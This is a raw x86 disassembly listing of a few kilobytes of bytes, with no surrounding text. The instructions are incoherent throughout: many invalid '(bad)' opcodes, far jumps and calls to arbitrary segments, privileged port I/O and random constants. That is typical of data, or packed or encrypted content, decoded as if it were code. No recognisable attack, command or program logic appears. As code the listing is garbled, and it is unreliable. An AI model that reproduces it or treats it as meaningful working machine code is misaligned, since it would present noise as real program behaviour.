  4204fe:	inc    ecx
  4204ff:	test   al,0x0
  420501:	scas   al,BYTE PTR es:[edi]
  420502:	xor    esi,DWORD PTR [eax+0x337670ff]
  420508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420509:	retf   0x9579
  42050c:	dec    edi
  42050d:	push   esi
  42050e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42050f:	or     esp,DWORD PTR [ebp-0x4b]
  420512:	call   0x4422:0x8408cd37
  420519:	popa   
  42051a:	jne    0x42055f
  42051c:	fwait
  42051d:	sbb    al,0x92
  42051f:	fs jecxz 0x420535
  420522:	scas   al,BYTE PTR es:[edi]
  420523:	jnp    0x4204f0
  420525:	push   0xffffff8e
  420527:	imul   BYTE PTR [esi]
  420529:	imul   ebp,DWORD PTR [edi-0x1545414e],0xa88d968
  420533:	clc    
  420534:	jle    0x420562
  420536:	mov    eax,ds:0x994e3108
  42053b:	mov    esp,0xaa4a4760
  420540:	jmp    0x4204ce
  420542:	add    ch,BYTE PTR [ebx-0x18]
  420545:	mov    dl,BYTE PTR [ebx+0x6a]
  420548:	call   0x9920ea31
  42054d:	jmp    0x4e83:0xb0aa4968
  420554:	lahf   
  420555:	call   0x6c5b:0x3f10cb38
  42055c:	sbb    DWORD PTR [eax-0x76c6e5bf],ebp
  420562:	out    dx,eax
  420563:	or     al,0xe5
  420565:	jl     0x4205e1
  420567:	mov    ah,0x9e
  420569:	sbb    al,0xe
  42056b:	sub    BYTE PTR [ecx-0x279931b4],al
  420571:	add    DWORD PTR cs:[ebx-0x278286f],eax
  420578:	icebp  
  420579:	sbb    ebp,ecx
  42057b:	xor    al,0x4b
  42057d:	std    
  42057e:	fiadd  WORD PTR [eax]
  420580:	mov    bh,ch
  420582:	add    edi,ebp
  420584:	push   ecx
  420585:	ss xchg esp,eax
  420587:	xor    eax,0xcc4b245f
  42058c:	or     al,0xe2
  42058e:	mov    fs,edi
  420590:	xchg   edi,eax
  420591:	sub    cl,BYTE PTR [ebx]
  420593:	mov    esp,0xb80d7902
  420598:	stos   BYTE PTR es:[edi],al
  420599:	mov    eax,0x6e6266be
  42059e:	push   ds
  42059f:	adc    BYTE PTR [ebx-0x7917c0bc],bl
  4205a5:	pop    esp
  4205a6:	enter  0xa470,0xad
  4205aa:	lds    ecx,FWORD PTR [ebx-0x60]
  4205ad:	fdivr  QWORD PTR [ebp-0x4c]
  4205b0:	jle    0x420596
  4205b2:	popf   
  4205b3:	mov    dh,cl
  4205b5:	jbe    0x42062c
  4205b7:	cmp    DWORD PTR [ebx+0x846d4eb],esp
  4205bd:	or     eax,0x6c7b5fbd
  4205c2:	not    DWORD PTR [ebx-0x1d919b18]
  4205c8:	pop    ss
  4205c9:	mov    DWORD PTR [eax+0x68eda29],esi
  4205cf:	jmp    0x1837:0xe9972fdc
  4205d6:	jo     0x420655
  4205d8:	aad    0x73
  4205da:	out    0xa6,eax
  4205dc:	adc    eax,0xc7923d8f
  4205e1:	mov    dh,0x2b
  4205e3:	or     ebx,DWORD PTR [edi-0x539b0f7d]
  4205e9:	pushf  
  4205ea:	push   ebp
  4205eb:	rcr    DWORD PTR [ebx+edi*8-0x59],cl
  4205ef:	(bad)  
  4205f0:	pop    eax
  4205f1:	mov    esi,0x8a295281
  4205f6:	xchg   edx,eax
  4205f7:	add    BYTE PTR [ecx],bh
  4205f9:	jp     0x420662
  4205fb:	mov    esi,0xbe13b613
  420600:	sbb    BYTE PTR [edx+0x11],cl
  420603:	cmp    esi,DWORD PTR [eax]
  420605:	cmc    
  420606:	cmp    DWORD PTR [edi-0x5ff07234],edi
  42060c:	add    BYTE PTR [eax],0x23
  42060f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420610:	cli    
  420611:	pop    ds
  420612:	js     0x4205c1
  420614:	mov    ds:0x36d5bb11,al
  420619:	fs jno 0x42065c
  42061c:	test   eax,0x1fdcbe2b
  420621:	in     eax,dx
  420622:	in     eax,0x2d
  420624:	shl    BYTE PTR [edx-0x1014950a],cl
  42062a:	cmc    
  42062b:	(bad)  
  42062d:	or     DWORD PTR [ecx+eax*2+0x1e1c017b],edx
  420634:	out    0xaa,eax
  420636:	or     dl,BYTE PTR [ebp-0x69d8d60f]
  42063c:	or     eax,esi
  42063e:	dec    ecx
  42063f:	or     edx,DWORD PTR [ecx]
  420641:	add    BYTE PTR [edx-0x1f],ah
  420644:	and    DWORD PTR [edi+0x3f4d8dc9],0x8d9155a3
  42064e:	sub    DWORD PTR [ecx+0x56],ebp
  420651:	inc    edx
  420652:	adc    BYTE PTR [ebx],bh
  420654:	imul   edx,DWORD PTR [esi+0xa],0x75b2dc12
  42065b:	in     al,dx
  42065c:	and    eax,DWORD PTR ds:0xa4240761
  420662:	xor    edx,ebx
  420664:	mov    ds:0x16666f55,al
  420669:	test   DWORD PTR [ecx-0x54],edi
  42066c:	push   bx
  42066e:	lods   eax,DWORD PTR ds:[esi]
  42066f:	sbb    esi,DWORD PTR [ebx-0x6f221660]
  420675:	cmp    bh,BYTE PTR [esi]
  420677:	pushf  
  420678:	mov    dl,0xc
  42067a:	lods   eax,DWORD PTR ds:[esi]
  42067b:	mov    edi,0x1d329517
  420680:	dec    esi
  420681:	call   0x2a39:0x4bd0f7c6
  420688:	xchg   edx,eax
  420689:	inc    esp
  42068a:	stos   BYTE PTR es:[edi],al
  42068b:	stos   BYTE PTR es:[edi],al
  42068c:	test   eax,0xc44d9d20
  420691:	sub    ecx,DWORD PTR [edx]
  420693:	dec    ecx
  420694:	in     eax,dx
  420695:	stc    
  420696:	inc    edi
  420697:	adc    ebp,DWORD PTR [edx]
  420699:	xchg   ecx,eax
  42069a:	jns    0x420719
  42069c:	pop    esp
  42069d:	pushf  
  42069e:	sbb    BYTE PTR [eax],cl
  4206a0:	adc    BYTE PTR [esi+ebp*1+0x5af0b414],bl
  4206a7:	mov    bh,dh
  4206a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206aa:	data16 cs int 0x85
  4206ae:	jnp    0x420720
  4206b0:	xor    bl,BYTE PTR [edx]
  4206b2:	sbb    al,0xd1
  4206b4:	sub    eax,0x3b9fe072
  4206b9:	push   esp
  4206ba:	rcr    ebx,0xa5
  4206bd:	add    BYTE PTR [ebx+edx*4-0x74],bh
  4206c1:	pop    ebx
  4206c2:	in     eax,dx
  4206c3:	pop    eax
  4206c4:	imul   esp
  4206c6:	shl    BYTE PTR [edx-0x3d494646],1
  4206cc:	and    BYTE PTR [ecx+0x71],bl
  4206cf:	dec    ecx
  4206d0:	add    edx,DWORD PTR [edi]
  4206d2:	jbe    0x420744
  4206d4:	and    ebx,DWORD PTR [ebx-0x3b]
  4206d7:	cmc    
  4206d8:	adc    DWORD PTR [eax-0x713b7e56],edx
  4206de:	ficomp WORD PTR [ecx-0x23bb0af1]
  4206e4:	adc    BYTE PTR [edi-0x71],0x16
  4206e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206ea:	mov    BYTE PTR [eax-0x67],bh
  4206ed:	xor    eax,0x7b8b1dfa
  4206f2:	sbb    eax,0x8e04d2c4
  4206f7:	lds    edi,FWORD PTR [esi-0x4896c1f6]
  4206fd:	inc    edx
  4206fe:	lahf   
  4206ff:	pop    ebx
  420700:	(bad)  
  420701:	arpl   WORD PTR [edi+0x7d],si
  420704:	sti    
  420705:	je     0x4206a1
  420707:	inc    ebp
  420708:	xchg   ebp,eax
  420709:	je     0x4206fb
  42070b:	or     bl,dh
  42070d:	push   esi
  42070e:	(bad)  
  420710:	and    dh,ch
  420712:	popa   
  420713:	pop    ecx
  420714:	dec    ebx
  420715:	xchg   DWORD PTR [edx],esp
  420717:	xchg   ebx,eax
  420718:	sub    DWORD PTR [ebx],edx
  42071a:	rol    BYTE PTR [edx-0x7eb78b02],cl
  420720:	xchg   ebp,eax
  420721:	ret    0x7a71
  420724:	fimul  WORD PTR [esi]
  420726:	into   
  420727:	xchg   edi,eax
  420728:	ret    0x5fd4
  42072b:	adc    eax,0x7f272ff8
  420730:	(bad)  
  420731:	mov    eax,ds:0xacaddadb
  420736:	jo     0x4207a0
  420738:	int3   
  420739:	scas   eax,DWORD PTR es:[edi]
  42073a:	and    al,0x10
  42073c:	(bad)  
  42073d:	icebp  
  42073e:	(bad)  
  42073f:	cwde   
  420740:	inc    ebp
  420741:	or     eax,esp
  420743:	das    
  420744:	mov    dl,0xa0
  420746:	sub    al,0x2c
  420748:	inc    edi
  420749:	dec    esp
  42074a:	fs mov ah,0x2c
  42074d:	je     0x4207b2
  42074f:	push   ebx
  420750:	mov    ecx,0xa226374e
  420755:	out    0x23,eax
  420757:	call   0x12026c5d
  42075c:	pop    ebx
  42075d:	out    dx,eax
  42075e:	sbb    al,0x7
  420760:	aaa    
  420761:	pop    eax
  420762:	mov    ch,0x7e
  420764:	cmp    BYTE PTR [eax],bh
  420766:	push   ss
  420767:	jmp    0x4207a2
  420769:	gs push ds
  42076b:	cmp    eax,0xc954db11
  420770:	test   eax,0x2ab17850
  420775:	mov    ah,0xfa
  420777:	das    
  420778:	stos   BYTE PTR es:[edi],al
  420779:	xchg   ebx,eax
  42077a:	inc    esp
  42077b:	pop    ss
  42077c:	and    ebp,0x10
  42077f:	(bad)  
  420780:	lods   al,BYTE PTR ds:[esi]
  420781:	repz imul esp,ebp,0xffffffdb
  420785:	sbb    ebp,ebp
  420787:	push   ecx
  420788:	mov    ds:0xc2ca06d5,eax
  42078d:	into   
  42078e:	push   ebx
  42078f:	mov    ah,0x65
  420791:	out    0xe2,al
  420793:	pop    ecx
  420794:	sub    eax,DWORD PTR [edx]
  420796:	into   
  420797:	(bad)  
  420798:	in     eax,0xa0
  42079a:	mov    cl,0xe8
  42079c:	push   ebp
  42079d:	(bad)  
  42079f:	iret   
  4207a0:	test   BYTE PTR [eax+0x7222ab],dl
  4207a6:	(bad)  
  4207a7:	pop    edi
  4207a8:	cmp    al,0x97
  4207aa:	iret   
  4207ab:	xchg   ebp,eax
  4207ac:	loop   0x4207bb
  4207ae:	outs   dx,BYTE PTR ds:[esi]
  4207af:	sahf   
  4207b0:	pop    es
  4207b1:	test   DWORD PTR [ecx-0x12],0x359af755
  4207b8:	and    edi,DWORD PTR [ecx]
  4207ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207bb:	pushf  
  4207bc:	cli    
  4207bd:	imul   BYTE PTR [ecx]
  4207bf:	or     eax,0x4180e070
  4207c4:	out    dx,eax
  4207c5:	mov    eax,0xb0622c9
  4207ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207cc:	adc    ecx,edx
  4207ce:	push   esi
  4207cf:	inc    ebx
  4207d0:	dec    esi
  4207d1:	fld    DWORD PTR [ecx-0x30bbb57a]
  4207d7:	xchg   edx,eax
  4207d8:	js     0x420850
  4207da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207db:	dec    ebx
  4207dc:	test   eax,0xb0975253
  4207e1:	sub    DWORD PTR [eax],edx
  4207e3:	pop    es
  4207e4:	mov    al,ds:0x114d6e90
  4207e9:	loope  0x42076f
  4207eb:	mov    esi,0xc2995826
  4207f0:	xor    DWORD PTR ds:0x47ec8cea,esp
  4207f6:	xlat   BYTE PTR ds:[ebx]
  4207f7:	pushf  
  4207f8:	leave  
  4207f9:	in     al,dx
  4207fa:	xchg   ebp,eax
  4207fb:	ss out dx,al
  4207fd:	aas    
  4207fe:	xor    esi,DWORD PTR [ebp+0x321155c8]
  420804:	aam    0xa5
  420806:	mov    eax,ds:0x9941baff
  42080b:	in     eax,0x49
  42080d:	out    0x66,al
  42080f:	mov    ds,ecx
  420811:	mov    cs,esi
  420813:	stos   DWORD PTR es:[edi],eax
  420814:	mov    dh,0xa4
  420816:	cld    
  420817:	je     0x42079a
  420819:	mov    bl,0xaf
  42081b:	add    eax,0xd4d43a72
  420820:	jmp    0xe5ec:0x5f65d6b0
  420827:	jg     0x420836
  420829:	add    al,0x24
  42082b:	mov    edx,edi
  42082d:	xchg   ebp,eax
  42082e:	sub    BYTE PTR [edi+0x18],dl
  420831:	hlt    
  420832:	mov    ds:0x5a41bbe3,al
  420837:	cld    
  420838:	sti    
  420839:	lods   eax,DWORD PTR ds:[esi]
  42083a:	and    DWORD PTR [ebx+0x662f5ed3],esi
  420840:	clc    
  420841:	jae    0x420894
  420843:	jle    0x420803
  420845:	add    BYTE PTR [edi+0xf2f9f84],ch
  42084b:	xor    DWORD PTR [edi-0x7c4f4898],esp
  420851:	sar    dl,cl
  420853:	mov    edi,0xe95e2ba2
  420858:	std    
  420859:	cwde   
  42085a:	mov    eax,cs:0x90491a2c
  420860:	mov    ebx,0x6aa2445b
  420865:	int    0xce
  420867:	mov    eax,ds:0x8ecd5ee
  42086c:	(bad)  
  42086d:	test   eax,0xd5c9adf2
  420872:	test   al,0xb3
  420874:	pop    ds
  420875:	sti    
  420876:	fsubr  DWORD PTR [eax+0x56]
  420879:	ss pop es
  42087b:	imul   esi,DWORD PTR [ecx],0x421ebcf0
  420881:	adc    ebx,edi
  420883:	mov    ds:0x1420ff5e,al
  420888:	outs   dx,BYTE PTR ds:[esi]
  420889:	xor    dh,0xe4
  42088c:	mov    eax,0x29a360a8
  420891:	sbb    ah,BYTE PTR [eax-0x3a]
  420894:	imul   esi,DWORD PTR [edx-0x24],0xba549a13
  42089b:	pop    edx
  42089c:	jo     0x42087f
  42089e:	dec    edx
  42089f:	pop    es
  4208a0:	add    BYTE PTR [ebp+0x24a5ff89],ch
  4208a6:	aam    0xf5
  4208a8:	stos   DWORD PTR es:[edi],eax
  4208a9:	or     dh,al
  4208ab:	jecxz  0x4208fc
  4208ad:	mov    bh,0x65
  4208af:	push   0x8ccec63d
  4208b4:	dec    esi
  4208b5:	fidivr DWORD PTR [eax]
  4208b7:	xor    BYTE PTR [edx-0x18],bl
  4208ba:	(bad)  
  4208bb:	outs   dx,BYTE PTR ds:[esi]
  4208bc:	test   eax,0xf620dea2
  4208c1:	xchg   BYTE PTR [edi],bl
  4208c3:	jle    0x420860
  4208c5:	jg     0x4208ad
  4208c7:	sub    DWORD PTR [esi+0x70],edx
  4208ca:	aaa    
  4208cb:	push   ecx
  4208cc:	fmul   DWORD PTR [edx+0x88a457]
  4208d2:	fwait
  4208d3:	xchg   esi,eax
  4208d4:	cmp    ecx,ebx
  4208d6:	pop    eax
  4208d7:	mov    ah,0xe1
  4208d9:	adc    BYTE PTR [ebx-0x5d49f463],0xde
  4208e0:	cs scas al,BYTE PTR es:[edi]
  4208e2:	jg     0x4208f6
  4208e4:	cmp    BYTE PTR [edx-0x2049138f],dl
  4208ea:	add    cl,BYTE PTR [ecx-0xd]
  4208ed:	xchg   edi,eax
  4208ee:	int3   
  4208ef:	sub    BYTE PTR [eax],0x1e
  4208f2:	in     al,dx
  4208f3:	lds    esi,FWORD PTR ds:0xc1b8b222
  4208f9:	add    esi,DWORD PTR [ebx+0x71e45005]
  4208ff:	or     DWORD PTR [esi],esi
  420901:	cmp    esp,DWORD PTR [eax]
  420903:	sub    edx,DWORD PTR [eax]
  420905:	fs loope 0x42097d
  420908:	jae    0x420892
  42090a:	jge    0x4208ec
  42090c:	jno    0x4208e1
  42090e:	iret   
  42090f:	add    eax,0xcc9dabaa
  420914:	jnp    0x42091a
  420916:	ror    BYTE PTR [edi+0x4f],0x4c
  42091a:	lods   al,BYTE PTR ds:[esi]
  42091b:	hlt    
  42091c:	(bad)  
  42091e:	shl    ah,1
  420920:	mov    ds:0x8c838b01,eax
  420925:	(bad)  
  420926:	(bad)  
  420927:	fst    DWORD PTR ds:0x5d314217
  42092d:	je     0x4208e3
  42092f:	xchg   esi,eax
  420930:	scas   eax,DWORD PTR es:[edi]
  420931:	mov    ecx,DWORD PTR [eax]
  420933:	in     eax,dx
  420934:	lock sub BYTE PTR [ebx],0x22
  420938:	je     0x42097a
  42093a:	jp     0x381934ef
  420940:	cli    
  420941:	ret    0xd087
  420944:	xor    BYTE PTR [edi-0x1493e60f],dl
  42094a:	je     0x420956
  42094c:	(bad)  
  42094d:	std    
  42094e:	in     eax,dx
  42094f:	aas    
  420950:	ds icebp 
  420952:	sbb    al,0xea
  420954:	dec    edi
  420955:	xchg   ebx,eax
  420956:	repz enter 0x6ce5,0x95
  42095b:	lods   eax,DWORD PTR ds:[esi]
  42095c:	aaa    
  42095d:	test   BYTE PTR [ebp+0x43],cl
  420960:	and    BYTE PTR [esi-0x77],al
  420963:	jecxz  0x420965
  420965:	std    
  420966:	inc    esi
  420967:	outs   dx,DWORD PTR ds:[esi]
  420968:	jmp    0x420993
  42096a:	mov    esi,DWORD PTR ds:0xe1c30bcf
  420970:	dec    eax
  420971:	or     al,BYTE PTR [esi]
  420973:	sbb    al,0xc2
  420975:	inc    ebx
  420976:	jge    0x4209de
  420978:	push   edx
  420979:	mov    WORD PTR [edx+0xe],ss
  42097c:	push   0x59
  42097e:	and    DWORD PTR [esp+ecx*1],esp
  420981:	cmp    edi,DWORD PTR cs:[edx]
  420984:	mov    DWORD PTR [esi],edi
  420986:	and    dh,0xfe
  420989:	lods   al,BYTE PTR ds:[esi]
  42098a:	dec    edx
  42098b:	es ins DWORD PTR es:[edi],dx
  42098d:	inc    ecx
  42098e:	push   ebx
  42098f:	jp     0x420945
  420991:	or     esi,DWORD PTR [eax]
  420993:	push   cs
  420994:	fwait
  420995:	dec    ecx
  420996:	dec    ebp
  420997:	adc    dl,BYTE PTR [edx+edx*2-0x78]
  42099b:	dec    edx
  42099c:	push   eax
  42099d:	out    dx,eax
  42099e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42099f:	in     al,0x94
  4209a1:	test   al,0x7e
  4209a3:	adc    DWORD PTR [ebx+0x53],ecx
  4209a6:	loopne 0x420a00
  4209a8:	out    0x79,al
  4209aa:	(bad)  
  4209ab:	or     BYTE PTR [esi+edi*4+0x43],cl
  4209af:	loopne 0x4209d4
  4209b1:	addr16 and al,0x91
  4209b4:	icebp  
  4209b5:	scas   al,BYTE PTR es:[edi]
  4209b6:	shl    DWORD PTR [esi+0x66f81dc5],cl
  4209bc:	adc    ebx,DWORD PTR [esi+eiz*8-0x3]
  4209c0:	dec    eax
  4209c1:	xchg   ebp,eax
  4209c2:	js     0x4209ce
  4209c4:	(bad)  
  4209c5:	xchg   edi,eax
  4209c6:	inc    eax
  4209c7:	add    al,0x69
  4209ca:	lea    edi,[esi-0x11c9b4c6]
  4209d0:	clc    
  4209d1:	inc    edi
  4209d2:	test   DWORD PTR [ecx+0x4b64a9a2],0x4f023aa6
  4209dc:	adc    DWORD PTR [bx],edi
  4209df:	loopne 0x420968
  4209e1:	and    eax,0xb56aea8d
  4209e6:	test   bl,0x32
  4209e9:	push   esi
  4209ea:	mov    edx,0x36d21d7a
  4209ef:	or     bh,cl
  4209f1:	test   al,0x3a
  4209f3:	xchg   esp,eax
  4209f4:	fdiv   DWORD PTR [edi+eax*2+0x20080375]
  4209fb:	pop    DWORD PTR [ecx+0x759b2648]
  420a01:	inc    edx
  420a02:	imul   ecx,DWORD PTR [eax-0x45],0xead5fd5b
  420a09:	mov    cl,0xea
  420a0b:	jge    0x420a45
  420a0d:	mov    esp,0x247e7ab5
  420a12:	sub    al,0xd8
  420a14:	pop    es
  420a15:	or     DWORD PTR [esi-0x61],ecx
  420a18:	and    ah,cl
  420a1a:	popf   
  420a1b:	mov    ds:0xa9e45161,eax
  420a20:	je     0x4209f5
  420a22:	(bad)  
  420a23:	push   ds
  420a24:	xchg   BYTE PTR [ebp+0x76a6a6c9],dl
  420a2a:	adc    ecx,ebp
  420a2c:	sbb    BYTE PTR [eax+0x5081c48e],0xef
  420a33:	std    
  420a34:	in     eax,dx
  420a35:	sti    
  420a36:	or     eax,0xe402abc2
  420a3b:	inc    ebp
  420a3d:	loope  0x420a2d
  420a3f:	outs   dx,BYTE PTR ds:[esi]
  420a40:	xchg   ebx,eax
  420a41:	push   edi
  420a42:	fs xchg edi,eax
  420a44:	cmp    bl,BYTE PTR [ebp+0x44700ece]
  420a4a:	(bad)  
  420a4b:	out    0xb,eax
  420a4d:	pushf  
  420a4e:	stc    
  420a4f:	jns    0x420ac3
  420a51:	addr16 mov cl,0xbd
  420a54:	cmp    bh,BYTE PTR [edx]
  420a56:	cmp    BYTE PTR [ebp-0x76],0xc8
  420a5a:	jb     0x420a60
  420a5c:	cmp    BYTE PTR [ecx+esi*1-0x7],ah
  420a60:	jle    0x420a15
  420a62:	fwait
  420a63:	jnp    0x420ab9
  420a65:	pusha  
  420a66:	cli    
  420a67:	jnp    0x420a95
  420a69:	fld    DWORD PTR ds:0xe69a7d65
  420a6f:	xchg   ecx,eax
  420a70:	cmp    al,0xf0
  420a72:	out    dx,al
  420a73:	dec    eax
  420a74:	pop    esp
  420a75:	and    dl,BYTE PTR [esp+edx*2-0x5e66fc4c]
  420a7c:	loop   0x420afd
  420a7e:	lahf   
  420a7f:	sub    DWORD PTR [ecx],eax
  420a81:	cmp    dl,bl
  420a83:	int    0x5b
  420a85:	mov    ch,0xc3
  420a87:	(bad)  
  420a88:	sti    
  420a89:	and    al,0x19
  420a8b:	sub    DWORD PTR [esi],ebx
  420a8d:	fdiv   QWORD PTR [esi-0x1b]
  420a91:	arpl   si,bx
  420a93:	jge    0x420ad4
  420a95:	or     esi,ebx
  420a97:	and    eax,0xba7f43e0
  420a9c:	inc    eax
  420a9d:	repz ds into 
  420aa0:	jae    0x420a39
  420aa2:	push   eax
  420aa3:	je     0x420b1e
  420aa5:	mov    ecx,0x11fceee5
  420aaa:	jp     0x420a63
  420aac:	test   eax,0x95eca816
  420ab1:	aaa    
  420ab2:	fwait
  420ab3:	push   ebx
  420ab4:	sbb    al,0x3a
  420ab6:	fs data16 hlt 
  420ab9:	mov    ecx,0x21a90024
  420abe:	adc    BYTE PTR ds:0x5cc733a1,dh
  420ac4:	hlt    
  420ac5:	das    
  420ac6:	dec    ecx
  420ac7:	lea    ebp,[esp+ebp*1-0x2ab8f90c]
  420ace:	xchg   edi,eax
  420acf:	ins    DWORD PTR es:[edi],dx
  420ad0:	hlt    
  420ad1:	dec    edx
  420ad2:	add    edi,eax
  420ad4:	xor    DWORD PTR [esi-0x7e450398],ebp
  420ada:	and    ebp,ebx
  420adc:	and    DWORD PTR [ebx+0x48],edi
  420adf:	xchg   edi,eax
  420ae0:	stos   BYTE PTR es:[edi],al
  420ae1:	stos   DWORD PTR es:[edi],eax
  420ae2:	jae    0x420b07
  420ae4:	mov    eax,0xdbdded20
  420ae9:	mov    eax,ds:0x4bb5ec50
  420aee:	adc    dh,ah
  420af0:	xor    DWORD PTR [esi],eax
  420af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420af3:	lds    ebx,FWORD PTR [ebx]
  420af5:	test   BYTE PTR [edx+edx*2],dh
  420af8:	(bad)  
  420afb:	loope  0x420b53
  420afd:	stc    
  420afe:	outs   dx,BYTE PTR ds:[esi]
  420aff:	ja     0x420ad2
  420b01:	jp     0x420b1c
  420b03:	ins    DWORD PTR es:[edi],dx
  420b04:	mul    BYTE PTR [edx]
  420b06:	sar    BYTE PTR [ecx],1
  420b08:	call   0x11ff24ba
  420b0d:	ret    0xc16e
  420b10:	cmp    al,0x81
  420b12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b13:	test   BYTE PTR [ebp+esi*8-0x775ce8c],cl
  420b1a:	mov    BYTE PTR [eax+0x68495ab8],ah
  420b20:	mov    edx,DWORD PTR [esi-0x5e]
  420b23:	loope  0x420b55
  420b25:	test   ebp,ecx
  420b27:	xor    eax,0x949be256
  420b2c:	arpl   WORD PTR [eax-0x504b8e58],bx
  420b32:	je     0x420ad0
  420b34:	push   0x8088b80a
  420b39:	and    bl,ah
  420b3b:	ins    BYTE PTR es:[edi],dx
  420b3c:	xchg   DWORD PTR [esi+0x58],edx
  420b3f:	pop    ebx
  420b40:	push   ecx
  420b41:	dec    ebx
  420b42:	imul   edx,DWORD PTR [eax+0x2f],0x8cfe4170
  420b49:	xor    DWORD PTR [ebx-0x26d5aa01],eax
  420b4f:	or     eax,0x9275e2d7
  420b54:	loop   0x420b7f
  420b56:	dec    BYTE PTR [edi+0x1ccdaf7e]
  420b5c:	xor    ah,BYTE PTR [ecx+0x66]
  420b5f:	and    dl,BYTE PTR [ebx+0x7a2cc518]
  420b65:	jmp    0x420b46
  420b67:	(bad)  
  420b69:	mov    bl,0x98
  420b6b:	sbb    ebx,DWORD PTR [esi-0x762b1aa6]
  420b71:	aad    0x92
  420b73:	sbb    ebx,DWORD PTR [edi-0x21]
  420b76:	stos   DWORD PTR es:[edi],eax
  420b77:	stos   BYTE PTR es:[edi],al
  420b78:	inc    eax
  420b79:	xor    al,0x4e
  420b7b:	out    dx,al
  420b7c:	or     cl,cl
  420b7e:	and    dl,BYTE PTR [eax]
  420b80:	pop    es
  420b81:	mov    al,0x40
  420b83:	mov    cl,BYTE PTR [esi-0xc]
  420b86:	std    
  420b87:	pop    esi
  420b88:	int    0x12
  420b8a:	jle    0x420b5e
  420b8c:	sbb    eax,0xf655eb04
  420b91:	fiadd  DWORD PTR [esi+eax*2]
  420b94:	xchg   esi,eax
  420b95:	popa   
  420b96:	mov    ebp,0xa0051ead
  420b9b:	add    BYTE PTR [esi-0x33],ah
  420b9e:	mov    eax,0xcd7168f7
  420ba3:	and    DWORD PTR [edi-0x7da1e4ca],edi
  420ba9:	jno    0x420bb7
  420bab:	xor    al,0x87
  420bad:	sahf   
  420bae:	sbb    dh,0x86
  420bb1:	pop    eax
  420bb2:	cmp    ebx,0xb2af32b5
  420bb8:	mov    BYTE PTR [esi],cl
  420bba:	in     eax,0x8
  420bbc:	addr16 (bad) 
  420bbf:	clc    
  420bc0:	xchg   esi,eax
  420bc1:	mov    ebp,DWORD PTR gs:[ebx]
  420bc4:	mov    edx,0x41ab4a53
  420bc9:	repnz mov ds,WORD PTR [ebp+0x4a63906a]
  420bd0:	fnstsw WORD PTR [esi+0x6e3268d5]
  420bd6:	push   edx
  420bd7:	pop    ecx
  420bd8:	ins    BYTE PTR es:[edi],dx
  420bd9:	test   BYTE PTR [eax+0x5f616503],al
  420bdf:	or     ah,bl
  420be1:	mov    DWORD PTR [eax],esp
  420be3:	push   eax
  420be4:	mov    ds:0xcd1a4c7d,al
  420be9:	les    sp,DWORD PTR fs:[edx]
  420bed:	stos   DWORD PTR es:[edi],eax
  420bee:	dec    esi
  420bef:	xchg   ebp,eax
  420bf0:	fcmovne st,st(4)
  420bf2:	mov    esi,0x1d9f8332
  420bf7:	es mov ebp,0x200356d2
  420bfd:	stos   DWORD PTR es:[edi],eax
  420bfe:	setb   BYTE PTR [ebx-0x6a]
  420c02:	into   
  420c03:	nop
  420c04:	push   es
  420c05:	loope  0x420c14
  420c07:	mov    ds:0x91e88ef3,eax
  420c0c:	pop    eax
  420c0d:	mov    ch,0x70
  420c0f:	enter  0x8f93,0x15
  420c13:	sbb    esp,DWORD PTR [esi]
  420c15:	(bad)  
  420c16:	jmp    0x420c83
  420c18:	lods   al,BYTE PTR ds:[esi]
  420c19:	pop    edi
  420c1a:	retf   0xbca7
  420c1d:	adc    BYTE PTR [edx-0x578cb82],bh
  420c23:	xchg   DWORD PTR [edi+0x64],ebp
  420c26:	pop    ecx
  420c27:	sbb    dh,BYTE PTR [ecx+0x787e6114]
  420c2d:	jbe    0x420c73
  420c2f:	mov    DWORD PTR [eax],ebx
  420c31:	mov    al,0xc3
  420c33:	call   FWORD PTR [ebx]
  420c35:	lods   al,BYTE PTR ds:[esi]
  420c36:	loopne 0x420ca8
  420c38:	mov    eax,0xe52d811e
  420c3d:	(bad)  [ecx+0x1bda81c8]
  420c43:	lods   eax,DWORD PTR ds:[esi]
  420c44:	sbb    BYTE PTR [ecx+edi*8-0x4e9fae31],ah
  420c4b:	sti    
  420c4c:	test   DWORD PTR [eax-0x3f],edi
  420c4f:	jbe    0x420be2
  420c51:	xor    al,0xa2
  420c53:	fcomp  st(6)
  420c55:	imul   esp,DWORD PTR [esi],0xffffffbf
  420c58:	cmp    bh,BYTE PTR [ebx+0x63]
  420c5b:	ja     0x420c28
  420c5d:	stos   DWORD PTR es:[edi],eax
  420c5e:	test   DWORD PTR [ebx],esi
  420c60:	sub    DWORD PTR ss:[esi+eax*1],eax
  420c64:	sbb    ch,BYTE PTR [esi]
  420c66:	push   es
  420c67:	outs   dx,DWORD PTR ds:[esi]
  420c68:	scas   al,BYTE PTR es:[edi]
  420c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c6a:	xchg   DWORD PTR [edi+0x66],edi
  420c6d:	inc    esi
  420c6e:	sub    BYTE PTR [ebx+0x1d9b65a],cl
  420c74:	add    eax,0x7625f66
  420c79:	enter  0x9102,0xe4
  420c7d:	lock out 0x36,al
  420c80:	out    0xbe,eax
  420c82:	sahf   
  420c83:	jbe    0x420ca8
  420c85:	cld    
  420c86:	adc    DWORD PTR [ecx-0x7b],esi
  420c89:	lods   al,BYTE PTR ds:[esi]
  420c8a:	in     eax,dx
  420c8b:	in     eax,0xb7
  420c8d:	push   edi
  420c8e:	inc    ecx
  420c8f:	bound  esi,QWORD PTR [eax+edx*2-0x692bffd1]
  420c96:	nop
  420c97:	adc    eax,0xf7306203
  420c9c:	adc    eax,0x7b414943
  420ca1:	popa   
  420ca2:	gs sbb eax,0xaa04a1d2
  420ca8:	leave  
  420ca9:	xchg   esp,eax
  420caa:	xchg   esi,eax
  420cab:	test   al,0xce
  420cad:	mov    esi,0xe312bab6
  420cb2:	add    cl,ah
  420cb4:	retf   0x7590
  420cb7:	out    0xd6,eax
